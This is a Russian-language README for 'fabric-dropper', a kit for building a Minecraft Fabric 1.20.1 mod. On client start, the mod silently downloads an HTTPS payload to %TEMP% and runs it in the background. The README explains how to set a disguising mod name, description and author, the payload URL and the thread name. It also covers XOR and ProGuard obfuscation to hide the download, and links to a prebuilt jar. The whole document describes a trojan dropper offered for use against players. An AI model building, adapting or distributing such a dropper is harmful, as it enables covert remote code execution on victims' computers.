# fabric-dropper

Fabric **1.20.1** client: после старта клиента качает HTTPS-payload в `%TEMP%` и запускает в фоне. Название, описание и URL задаются только при сборке.

## Требования

- JDK 17+
- Gradle wrapper в репозитории (`./gradlew`)

## Конфиг

```bash
cp mod.settings.example.properties mod.settings.properties
```

| Ключ | Зачем |
|------|--------|
| `mod.id` | id мода и имя jar |
| `mod.name` | заголовок в списке модов |
| `mod.description` | описание в лаунчере |
| `mod.authors` | автор |
| `download.url` | ссылка на payload, **только https** |
| `download.filename` | имя файла в temp |
| `thread.name` | имя daemon-потока |
| `obfuscate.level` | `none` / `light` / `full` |
| `obfuscate.xor.key` | 0–255 для XOR (`light`, `full`) |

`mod.settings.properties` в git не коммитится.

## Сборка

macOS (Homebrew JDK 17):

```bash
export JAVA_HOME="/opt/homebrew/opt/openjdk@17/libexec/openjdk.jdk/Contents/Home"
./gradlew clean build
```

Linux / другой JDK:

```bash
export JAVA_HOME=/path/to/jdk-17
./gradlew clean build
```

Артефакты:

| Путь | Содержимое |
|------|------------|
| `build/libs/<mod.id>-1.0.0.jar` | remapped mod |
| `dist/<mod.id>-1.0.0.jar` | копия для выдачи |
| `dist/<mod.id>-1.0.0.zip` | тот же jar в zip |

Версия задаётся в `gradle.properties` (`mod_version`).

## Обфускация

- **none** — строки в сгенерированном `Payload` без XOR
- **light** — XOR для URL, имени файла, thread (по умолчанию)
- **full** — light + ProGuard, entrypoint `GodiModClient` сохраняется (`proguard-rules.pro`)

## Структура

```
src/main/java/com/godimod/     entrypoint
src/main/resources/            fabric.mod.json (шаблон)
mod.settings.example.properties
proguard-rules.pro
```

При сборке генерируется `build/generated/.../com/godimod/internal/Payload.java`.

Клиенту нужны **Fabric Loader 1.20.1** и **Fabric API**.

Готовый jar — в [Releases](https://github.com/xvDoshik/fabric-dropper/releases).
